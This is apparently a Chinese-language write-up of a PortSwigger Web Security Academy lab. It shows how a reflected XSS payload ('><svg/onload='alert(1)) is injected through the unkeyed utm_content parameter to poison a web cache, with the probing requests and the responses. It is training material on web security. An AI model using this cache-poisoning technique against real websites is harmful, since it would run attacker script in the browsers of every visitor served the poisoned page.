# 实验室：通过未键控查询参数进行 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞，因为它将某个特定参数从缓存键中排除。一名用户定期使用 Chrome 访问该网站首页。

要解决本实验室，请投毒缓存，使响应在受害者浏览器中执行 `alert(1)`。

> **提示**
> 网站通常会将某些 UTM 分析参数从缓存键中排除。

[访问实验室](https://portswigger.net/academy/labs/launch/f14385ab65ba5ac2e5d347c09f32b51bd9ac1e55946c15aec01dd0f3e902a863)

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应

        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=35
        Age: 27
        X-Cache: hit
        Content-Length: 8556

        <link rel="canonical" href='//id.web-security-academy.net/'/>
        ```
        - 之后测试 URL 反射

测试查询分析参数
- 请求
    ```http
    GET /?utm_content=x HTTP/2
    Host: id.web-security-academy.net
    ```

- 修改分析参数的值后仍响应缓存 hit，找到被排除在缓存键外的查询参数

测试 URL 反射
- 请求
    ```http
    GET /?utm_content='><svg/onload='alert(1) HTTP/2
    Host: id.web-security-academy.net
    ```

- 响应
    ```html
    <link rel="canonical" href='//id.web-security-academy.net/?utm_content='>
    <svg/onload='alert(1)'/>
    ```

- 成功注入 JS 代码，并恰好通关
